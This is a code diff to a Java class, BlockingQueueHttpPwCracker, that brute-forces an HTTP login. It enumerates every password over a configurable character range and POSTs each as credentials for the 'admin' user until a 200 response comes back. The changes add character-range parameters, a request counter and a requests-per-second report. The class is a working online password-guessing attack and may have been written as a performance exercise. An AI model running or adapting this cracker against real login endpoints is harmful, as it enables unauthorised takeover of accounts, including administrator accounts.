@@ -16,21 +16,24 @@ import java.util.concurrent.LinkedBlockingQueue;
 public class BlockingQueueHttpPwCracker implements PwCracker {
 
 
+    private final byte fromChar;
+    private final byte toChar;
     private final HttpClient httpClient;
     private final BlockingQueue<String> queue;
+    private int numberOfRequests = 0;
 
 
-    public BlockingQueueHttpPwCracker() {
+    public BlockingQueueHttpPwCracker(byte fromChar, byte toChar) {
         this.httpClient = HttpClient.newHttpClient();
         this.queue = new LinkedBlockingQueue<>(1000);
+        this.fromChar = fromChar;
+        this.toChar = toChar;
     }
 
     private String recursiveCombinationFinder(BlockingQueue<String> queue, int maxLength, int currentLength, byte[] currentPassword) {
         if (currentLength == maxLength) {
             try {
                 queue.put(new String(currentPassword));
-
-                System.out.println("Elements in queue: " + queue.size());
             } catch (InterruptedException e) {
                 throw new RuntimeException(e);
             }
@@ -38,7 +41,7 @@ public class BlockingQueueHttpPwCracker implements PwCracker {
             return null;
         }
 
-        for (int i = 33; i < 126; i++) {
+        for (int i = fromChar; i <= toChar; i++) {
             currentPassword[currentLength] = (byte) i;
             String result = recursiveCombinationFinder(queue, maxLength, currentLength + 1, currentPassword);
             if (result != null) {
@@ -60,10 +63,9 @@ public class BlockingQueueHttpPwCracker implements PwCracker {
                 byte[] passwordBytes = new byte[length];
                 recursiveCombinationFinder(queue, length, 0, passwordBytes);
             }
-            System.out.println("Queue filled");
         });
 
-        for (int i = 0; i < numberOfCores; i++) {
+        for (int i = 0; i < 1; i++) {
 
             executor.submit(() -> {
                 LocalTime start = LocalTime.now();
@@ -78,11 +80,13 @@ public class BlockingQueueHttpPwCracker implements PwCracker {
                                 .POST(HttpRequest.BodyPublishers.ofString(objectMapper.writeValueAsString(new User("admin", passWordToTry))))
                                 .build();
                         HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());
+                        this.numberOfRequests++;
                         if (response.statusCode() == 200) {
                             System.out.println("Password found: " + passWordToTry);
                             System.out.println("Time: " + start.until(LocalTime.now(), ChronoUnit.SECONDS) + " seconds");
+                            System.out.println("Number of requests: " + this.numberOfRequests);
+                            System.out.println("Requests per second: " + this.numberOfRequests / start.until(LocalTime.now(), ChronoUnit.SECONDS));
                             executor.shutdownNow();
-                            return passWordToTry;
                         }
                     } catch (Exception e) {
                         throw new RuntimeException(e);
